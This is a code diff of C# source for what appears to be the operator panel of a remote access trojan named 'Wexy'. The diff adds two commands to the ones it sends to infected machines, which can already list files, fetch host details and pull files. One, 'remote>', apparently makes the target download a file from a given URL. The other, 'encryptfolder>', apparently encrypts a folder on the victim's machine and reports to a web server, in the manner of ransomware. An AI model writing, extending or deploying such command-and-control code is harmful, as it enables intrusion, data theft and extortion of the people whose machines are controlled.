@@ -32,15 +32,16 @@ namespace Wexy
         {
             try
             {
-                if (Command != "showfiles>" && Command != "pcname>" && Command != "showfolders>" && Command != "getos>" && Command != "ischruser>" && Command != "download>" && Command != "getFile>")
+                if (Command != "showfiles>" && Command != "pcname>" && Command != "showfolders>" && Command != "getos>" && Command != "ischruser>" && Command != "download>" && Command != "getFile>" && Command !="remote>" && Command != "encryptfolder>")
                 {
+                    //Those commands don't require response
                     byte[] Packet = Encoding.ASCII.GetBytes(Command);
                     Writer.Write(Packet, 0, Packet.Length);
                     Writer.Flush();
                 }
                 else
                 {
-                    //These special commands require instant data reply using the revceivedata() method
+                    //These special commands require instant response using the revceivedata() method
                     switch (Command)
                     {
                         case "pcname>":
@@ -71,21 +72,30 @@ namespace Wexy
                             ReceiveData();
                             break;
 
-                        case "ischruser>":
+                        case "download>":
                             byte[] Packet4 = Encoding.ASCII.GetBytes(Command);
                             Writer.Write(Packet4, 0, Packet4.Length);
                             Writer.Flush();
-                            ReceiveData();
+                            //ReceiveFile();
                             break;
-                        case "download>":
+
+                        case "getFile>":
                             byte[] Packet5 = Encoding.ASCII.GetBytes(Command);
                             Writer.Write(Packet5, 0, Packet5.Length);
                             Writer.Flush();
-                            //ReceiveFile();
+                            ReceiveData();
                             break;
-                        case "getFile>":
+
+                        case "remote>":
                             byte[] Packet6 = Encoding.ASCII.GetBytes(Command);
                             Writer.Write(Packet6, 0, Packet6.Length);
+                            Writer.Flush();
+                            ReceiveData();
+                            break;
+
+                        case "encryptfolder>":
+                            byte[] Packet7 = Encoding.ASCII.GetBytes(Command);
+                            Writer.Write(Packet7, 0, Packet7.Length);
                             Writer.Flush();
                             ReceiveData();
                             break;
@@ -366,6 +376,8 @@ namespace Wexy
             string fileName = dff.GetFilename();
             string url = dff.GetUrl();
             SendCommand("remote>" + url + ">" + fileName + ">");
+            ReceiveData();
+            MessageBox.Show(received_data);
         }
 
         private void btn_encrypt_folder_Click(object sender, EventArgs e)
@@ -375,6 +387,8 @@ namespace Wexy
             string folderpath = ef.getFolderPath();
             string webServerUrl = ef.getWebServerUrl();
             SendCommand("encryptfolder>" + folderpath + ">" + webServerUrl + ">");
+            ReceiveData();
+            MessageBox.Show(received_data);
         }
 
         #endregion   
